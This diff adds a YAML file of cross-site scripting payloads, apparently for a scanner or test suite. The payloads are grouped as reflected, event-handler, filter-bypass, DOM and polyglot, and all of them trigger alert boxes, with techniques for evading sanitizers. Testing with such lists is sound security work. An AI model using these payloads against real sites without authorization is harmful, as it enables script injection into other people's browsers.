@@ -1,0 +1,41 @@
+reflected:
+  - "<script>alert(1)</script>"
+  - "<img src=x onerror=alert(1)>"
+  - "<svg onload=alert(1)>"
+  - "<body onload=alert(1)>"
+  - "<input onfocus=alert(1) autofocus>"
+  - "<marquee onstart=alert(1)>"
+  - "<details open ontoggle=alert(1)>"
+  - "<video src=x onerror=alert(1)>"
+
+event_handlers:
+  - "\" onfocus=\"alert(1)\" autofocus=\""
+  - "' onmouseover='alert(1)'"
+  - "\" onerror=\"alert(1)\" src=\"x"
+  - "' onload='alert(1)'"
+  - "\" onchange=\"alert(1)\""
+  - "\" onclick=\"alert(1)\""
+  - "\" oninput=\"alert(1)\""
+
+filter_bypass:
+  - "<scr<script>ipt>alert(1)</scr</script>ipt>"
+  - "<img/src=x onerror=alert(1)>"
+  - "javascript:alert(1)"
+  - "<svg/onload=alert(1)>"
+  - "<img src=x onerror=alert`1`>"
+  - "<script>alert(String.fromCharCode(88,83,83))</script>"
+  - "<iframe src=\"javascript:alert(1)\">"
+  - "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x xmlns=http://www.w3.org/2000/svg><animate attributeName=href values=javascript:alert(1) /><a id=y><rect width=100 height=100 />"
+  - "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"
+
+dom:
+  - "#<img src=x onerror=alert(1)>"
+  - "javascript:alert(document.domain)"
+  - "'-alert(1)-'"
+  - "\\'-alert(1)//'"
+  - "</script><script>alert(1)</script>"
+
+polyglot:
+  - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+  - "'\"><img src=x onerror=alert(1)>{{7*7}}${7*7}<%= 7*7 %>"
+  - "-->'\"--><script>alert(1)</script>"
